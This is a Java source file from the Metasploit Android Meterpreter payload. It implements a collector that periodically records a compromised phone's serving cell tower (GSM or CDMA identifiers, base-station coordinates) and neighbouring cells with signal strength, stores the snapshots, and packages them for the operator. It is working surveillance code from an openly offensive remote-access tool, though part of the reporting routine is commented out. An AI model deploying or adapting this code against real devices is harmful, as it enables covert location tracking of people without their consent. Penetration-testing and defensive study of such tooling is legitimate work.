package com.metasploit.meterpreter;

import com.metasploit.meterpreter.android.interval_collect;

import android.app.Activity;
import android.content.Context;

import android.os.Bundle;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;
import java.lang.Override;
import java.lang.Runnable;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

import android.util.Log;


import android.telephony.NeighboringCellInfo;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;

import android.telephony.CellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.telephony.cdma.CdmaCellLocation;

public class CellCollector extends IntervalCollector  {

    private final Object syncObject = new Object();
    protected TelephonyManager mTelephonyManager;
    private Hashtable<Long, CellResult> collections = null;

    private class CellResult {
        CellActive active;
        List<CellNeighbor> neighbors;

        public CellResult(CellActive cell) {
            this.active = cell;
            this.neighbors = new ArrayList<CellNeighbor>();
        }
         public CellResult() {
            this.neighbors = new ArrayList<CellNeighbor>();
         }
    }


    private class CellActiveCdma {
        public int mBaseId, mBaseLat, mBaseLong, mNetId, mSystemId;

        public CellActiveCdma(CdmaCellLocation info) {
            this.mBaseId = info.getBaseStationId();
            this.mBaseLat = info.getBaseStationLatitude();
            this.mBaseLong = info.getBaseStationLongitude();
            this.mNetId = info.getNetworkId();
            this.mSystemId = info.getSystemId();
        }

        public CellActiveCdma(DataInputStream input) throws IOException {
            this.mBaseId = input.readInt();
            this.mBaseLat = input.readInt();
            this.mBaseLong = input.readInt();
            this.mNetId = input.readInt();
            this.mSystemId = input.readInt();
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeInt(this.mBaseId);
            output.writeInt(this.mBaseLat);
            output.writeInt(this.mBaseLong);
            output.writeInt(this.mNetId);
            output.writeInt(this.mSystemId);
        }
    }

    private class CellActiveGsm {
        public int mCid, mLac, mPsc;

        public CellActiveGsm(GsmCellLocation info) {
            this.mCid = info.getCid();
            this.mLac = info.getLac();
            this.mPsc = info.getPsc();
        }

        public CellActiveGsm(DataInputStream input) throws IOException {
            this.mCid  = input.readInt();
            this.mLac  = input.readInt();
            this.mPsc  = input.readInt();
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeInt(this.mCid);
            output.writeInt(this.mLac);
            output.writeInt(this.mPsc);
        }
    }

    private class CellActive {
        public CellActiveCdma cdma;
        public CellActiveGsm gsm;
        public int ptype;

        public CellActive(GsmCellLocation info) {
            this.ptype = TelephonyManager.PHONE_TYPE_GSM;
            this.gsm = new CellActiveGsm(info);
        }

        public CellActive(CdmaCellLocation info) {
            this.ptype = TelephonyManager.PHONE_TYPE_CDMA;
            this.cdma = new CellActiveCdma(info);
        }

        public CellActive(DataInputStream input) throws IOException {
            this.ptype  = input.readInt();
            if (this.ptype == TelephonyManager.PHONE_TYPE_GSM) {
                this.gsm = new CellActiveGsm(input);
            }
            if (this.ptype == TelephonyManager.PHONE_TYPE_CDMA) {
                this.cdma = new CellActiveCdma(input);
            }
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeInt(this.ptype);

            if (this.ptype == TelephonyManager.PHONE_TYPE_GSM) {
                this.gsm.write(output);
            }
            if (this.ptype == TelephonyManager.PHONE_TYPE_CDMA) {
                this.cdma.write(output);
            }
        }
    }

    private class CellNeighbor {

        public int mType, mCid, mLac, mPsc, mRssi;

        public CellNeighbor(int ntype, int cid, int lac, int psc, int rssi) {
            this.mType = ntype;
            this.mCid  = cid;
            this.mLac  = lac;
            this.mPsc  = psc;
            this.mRssi = rssi;
        }

        public CellNeighbor(NeighboringCellInfo info) {
            this.mType = info.getNetworkType();
            this.mCid  = info.getCid();
            this.mLac  = info.getLac();
            this.mPsc  = info.getPsc();
            this.mRssi = info.getRssi();
        }

        public CellNeighbor(DataInputStream input) throws IOException {
            this.mType = input.readInt();
            this.mCid  = input.readInt();
            this.mLac  = input.readInt();
            this.mPsc  = input.readInt();
            this.mRssi = input.readInt();
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeInt(this.mType);
            output.writeInt(this.mCid);
            output.writeInt(this.mLac);
            output.writeInt(this.mPsc);
            output.writeInt(this.mRssi);
        }
    }

    public CellCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, CellResult>();
        mTelephonyManager = (TelephonyManager) AndroidMeterpreter.getContext()
          .getSystemService(Context.TELEPHONY_SERVICE);
    }

    public CellCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, CellResult>();
        mTelephonyManager = (TelephonyManager) AndroidMeterpreter.getContext().getSystemService(Context.TELEPHONY_SERVICE);
    }

    protected void init() { }

    protected void deinit() { }

    protected boolean collect(DataOutputStream output) throws IOException {
        CellActive active = null;
        CellResult result = null;

        // Identify our attached cell
        int ptype = mTelephonyManager.getPhoneType();
        switch(ptype) {
            case TelephonyManager.PHONE_TYPE_GSM:
                GsmCellLocation gloc = (GsmCellLocation) mTelephonyManager.getCellLocation();
                if (gloc == null) {
                   return false;
                }
                active = new CellActive(gloc);
                break;

            case TelephonyManager.PHONE_TYPE_CDMA:
                CdmaCellLocation cloc = (CdmaCellLocation) mTelephonyManager.getCellLocation();
                if (cloc == null) {
                   return false;
                }
                active = new CellActive(cloc);
                break;
            default:
                return false;
        }

        result = new CellResult(active);

        // Build a list of neighbors
        List<NeighboringCellInfo> neighbors = mTelephonyManager.getNeighboringCellInfo();
        if (neighbors != null) {
            for (int i=0; i < neighbors.size(); i++){
                result.neighbors.add(new CellNeighbor(neighbors.get(i)));
            }
        }

        synchronized (this.syncObject) {
            this.collections.put(System.currentTimeMillis(), result);

            // serialize and write to storage, formatted as:
            // Long( configured polling frequency [ timeout ] )
            // Long( number of snapshots taken )
            //    -> Long( timestamp )
            //          -> Long( active type )
            //          ->  (GSM info || CDMA info)
            //          -> Long( neighbor count)
            //                -> Long( network type )
            //                -> Short( cid )
            //                -> Short( lac )
            //                -> Short( psc )
            //                -> Short( rssi )


            output.writeLong(this.timeout);
            output.writeInt(this.collections.size());
            for (Long ts : this.collections.keySet()) {
                CellResult record;
                output.writeLong(ts.longValue());
                record = this.collections.get(ts.longValue());
                record.active.write(output);
                output.writeInt(record.neighbors.size());
                for (int i=0; i < record.neighbors.size(); i++) {
                    record.neighbors.get(i).write(output);
                }
            }
        }

        return true;
    }

    protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        int collectionCount = input.readInt();
        for (int i = 0; i < collectionCount; ++i) {
            long ts = input.readLong();
            CellResult result = new CellResult(new CellActive(input));
            int resultCount = input.readInt();
            for (int j = 0; j < resultCount; ++j) {
                result.neighbors.add(new CellNeighbor(input));
            }
            this.collections.put(ts, result);
        }
    }

    public boolean flush(TLVPacket packet) {
        Hashtable<Long, CellResult> collections = this.collections;
        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread if it's running
            this.collections = new Hashtable<Long, CellResult>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        try {
            for (Long ts : sortedKeys) {

                long timestamp = ts.longValue();
                CellResult result = collections.get(timestamp);
                TLVPacket resultSet = new TLVPacket();
                TLVPacket CellSet = new TLVPacket();


                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
  /*
                CellSet.add(interval_collect.TLV_TYPE_GEO_LAT, Double.toString(geoLoc.mLatitude));
                CellSet.add(interval_collect.TLV_TYPE_GEO_LONG, Double.toString(geoLoc.mLongitude));
                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, CellSet);

                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
                */
            }
        }
        catch (IOException ex) {
            // not good, but not much we can do here
        }

        return true;
    }
}

